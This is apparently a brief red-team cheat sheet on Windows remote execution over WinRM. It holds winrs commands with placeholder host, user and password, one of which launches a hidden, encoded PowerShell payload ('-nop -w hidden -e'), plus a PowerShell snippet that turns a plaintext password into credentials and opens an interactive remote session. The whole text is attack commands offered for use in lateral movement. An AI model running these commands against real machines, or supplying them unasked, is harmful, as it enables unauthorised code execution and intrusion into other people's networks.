# WINRM
#evil-winrm

#winrs
```
winrs -r:[remote host] -u:[user] -p:[password]  "cmd /c hostname & whoami"

# WINRM
winrs -r:[remote host] -u:[user] -p:[password]  "powershell -nop -w hidden -e [encoded payload]"
```

#PSSession
```
$username = '[user]]';
$password = '[password]';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName [ip / host] -Credential $credential

Enter-PSSession 1
```